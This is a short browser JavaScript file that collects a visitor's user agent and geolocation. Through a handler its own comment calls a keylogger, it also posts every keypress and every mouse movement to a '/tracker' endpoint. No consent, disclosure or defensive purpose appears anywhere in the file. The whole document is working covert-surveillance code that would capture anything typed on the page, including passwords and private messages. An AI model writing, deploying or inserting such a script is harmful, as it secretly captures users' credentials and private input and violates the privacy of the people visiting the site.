// Get User-Agent
const userAgent = navigator.userAgent;

// Get geolocation first
navigator.geolocation.getCurrentPosition(
  position => {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    // Send page visit with geolocation
    fetch("/tracker", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "visit",
        userAgent: userAgent,
        latitude: latitude,
        longitude: longitude,
        timestamp: Date.now()
      })
    });

    // Set up keylogger
    document.addEventListener("keydown", e => {
      fetch("/tracker", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "key",
          key: e.key,
          userAgent: userAgent,
          latitude: latitude,
          longitude: longitude,
          timestamp: Date.now()
        })
      });
    });

    // Set up mouse tracker
    document.addEventListener("mousemove", e => {
      fetch("/tracker", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "mouse",
          x: e.clientX,
          y: e.clientY,
          userAgent: userAgent,
          latitude: latitude,
          longitude: longitude,
          timestamp: Date.now()
        })
      });
    });

  },
  error => {
    console.warn("Geolocation error:", error.message);
    // Fallback if user denies or there's an error
    sendWithoutLocation();
  }
);

// Fallback function in case geolocation isn't available
function sendWithoutLocation() {
  fetch("/tracker", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      type: "visit",
      userAgent: navigator.userAgent,
      latitude: "Unknown",
      longitude: "Unknown",
      timestamp: Date.now()
    })
  });
}
